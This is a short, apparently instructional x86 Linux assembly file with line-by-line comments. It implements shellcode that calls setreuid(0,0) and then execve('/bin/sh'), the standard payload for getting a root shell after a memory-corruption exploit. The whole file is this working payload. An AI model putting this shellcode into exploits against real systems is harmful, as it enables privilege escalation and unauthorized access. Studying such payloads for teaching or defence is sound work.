section .text		; start the code section of the asm
global _start		; declare a global label

_start:				; get in the habit of using code labels
	;setreuid(0,0)
	xor ebx, ebx	; clear the ebx register
	mul ebx			; clear eax|edx register
	mov ecx, ebx	; clear the ecx register
	mov al, 0x46 	; move syscall # to al register
	int 0x80			; call kernel

	; execve("/bin/sh", 0, 0)
	push edx		; push NULL on the stack, value of edx
	push 0x68732f2f	; push '//sh' onto the stack, padded with leading '/'
	push 0x6e69622f	; push /bin onto the stack, notice strings in reverse
	mov  ebx, esp	; since esp now points to "/bin/sh", write to ebx
	push 0x0b		; push syscall # in the stack
	pop  eax		; pop syscall # in eax
	int  0x80		; call kernel
